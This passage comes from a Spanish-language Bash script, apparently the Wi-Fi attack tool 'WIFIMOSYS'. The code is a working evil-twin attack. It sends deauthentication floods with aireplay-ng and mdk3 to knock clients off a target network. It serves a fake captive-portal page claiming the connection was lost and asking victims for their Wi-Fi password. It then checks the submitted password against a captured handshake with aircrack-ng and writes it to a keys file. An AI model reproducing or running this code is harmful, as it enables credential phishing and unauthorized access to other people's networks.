	echo -e \"$grey    (Esperando a que la víctima cargue la página del Fake AP)""$transparent\"
	echo
	echo -e \"         SSID..............: "$green"$Host_SSID"$transparent"\"
	echo -e \"         MAC...............: "$white"$Host_MAC"$transparent"\"
	echo -e \"         Canal.............: "$white"$Host_CHAN"$transparent"\"
	echo -e \"         Fabricante........: "$white"$Host_MAC_MODEL"$transparent"\"
	echo -e \"         Tiempo atacando...: "$white"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
	echo
	echo -e \"$yellow    CLIENTES QUE SE HAN CONECTADO:""$transparent\"
	x=0
	for line in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	echo -e \"    "$green"\$x) "$red"\$(echo \$line| cut -d \" \" -f 3) "$yellow"\$(echo \$line| cut -d \" \" -f 5) "$green"\$(echo \$line| cut -d \" \" -f 6)"$transparent"\"   
	done
	echo -e \"    "$red      "\$(cat $RUTATEMP/fallidos.txt)"$transparent"\"
	
	echo -ne \"\033[H\033[u\"">>$RUTATEMP/handcheck
	
	echo "let i=\$i+1
	sleep 1">>$RUTATEMP/handcheck

	echo "done
	clear
	echo \"1\" > $RUTATEMP/status.txt

	sleep 3

	killall mdk3 &>$wifim_output_device
	killall aireplay-ng &>$wifim_output_device
	killall airbase-ng &>$wifim_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$wifim_output_device
	killall hostapd &>$wifim_output_device
	killall lighttpd &>$wifim_output_device
	killall dhcpd &>$wifim_output_device

	echo \"
	WIFIMOSYS $version by Absolut Vodker

	SSID: $Host_SSID
	BSSID: $Host_MAC ($Host_MAC_MODEL)
	Canal: $Host_CHAN
	Seguridad: $Host_ENC
	Tiempo: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $RUTATEMP/data.txt)
	
	Gracias por usar Wifimosys!
	\" >/opt/Wireless-Keys/$Host_SSID-wifimosys.txt">>$RUTATEMP/handcheck
	
	echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $RUTATEMP/$Host_MAC-01.cap -w $RUTATEMP/data.txt && echo 
	">>$RUTATEMP/handcheck
	
	echo "kill -INT \$(ps a | grep bash| grep wifim | awk '{print \$1}') &>$wifim_output_device">>$RUTATEMP/handcheck
	chmod +x $RUTATEMP/handcheck
}

##################################### Diferentes desautentificaciones

function deauthall {

	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando en $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}
function deauthmdk3 {

	echo "$Host_MAC" >$RUTATEMP/mdk3.txt
	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando via mdk3 en $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $RUTATEMP/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
}
function deauthesp {

	sleep 2
	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando cliente en $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

##################################### Cierra todos los procesos

function matartodo {

	killall aireplay-ng &>$wifim_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$wifim_output_device
	killall hostapd &>$wifim_output_device
	killall lighttpd &>$wifim_output_device
	killall dhcpd &>$wifim_output_device
	killall xterm &>$wifim_output_device
}

##################################### Crea el contenido del Fake AP

function FAKEAP {

	if [ ! -d $RUTATEMP/data ]; then
		mkdir $RUTATEMP/data
	fi
	CONSEGUIDO="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>error</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	    <style>
	.ui-btn {
	    width: 20% !important;
	}
	</style>
	</head>
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"top\" data-theme=\"a\">
		    <h3>Clave correcta</h3>
		</div>

		<div data-role=\"content\">

	"$CONSEGUIDO"
		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">

		</div>
	    </div>
	    <div data-role=\"page\" id=\"second\">
		<div data-theme=\"a\" data-role=\"top\">
		    <h3></h3>
		</div>

		<div data-role=\"content\">

		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
		</div>
	    </div>
	</body>
	</html>
	">$RUTATEMP/data/final.html

	echo "<!DOCTYPE html>
<html>
<head>
  <meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">
  <title>error</title>
  <meta name=\"viewport\"
  content=\"width=device-width, height=device-height, initial-scale=1.0\">
</head>

<body>

<div id=\"login\">

<div style=\"text-align:center;margin-left:auto;margin-right:auto;\">
<h3 style=\"text-align:center;margin-left:auto;margin-right:auto;\">Se ha perdido
la conexi&oacute;n</h3>
</div>

<div>
<fieldset>

  <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\"
  action=\"check.php\" method=\"POST\"
  style=\"text-align:center;margin-left:auto;margin-right:auto;\">

    <div class=\"ui-grid-c\">

    <div class=\"ui-block-a\"
    style=\"text-align:center;margin-left:auto;margin-right:auto;\">
    Red: <b>$Host_SSID</b></div>

    </div>
    <br>
    Por razones de seguridad es necesario validarse para acceder a Internet 

    <div>
    <label for=\"password\">Introduzca su contrase&ntilde;a Wifi:</label> </div>
    <input type=\"password\" value=\"\" name=\"key1\" id=\"key1\">

    <p>
    <input type=\"submit\" value=\"Aceptar\" name=\"submit\" id=\"submit\"> </p>
  </form>
</fieldset>
</div>

<div>
</div>
</div>
</body>
</html>
	">$RUTATEMP/data/index.htm
}
limpialog
top&& setinterface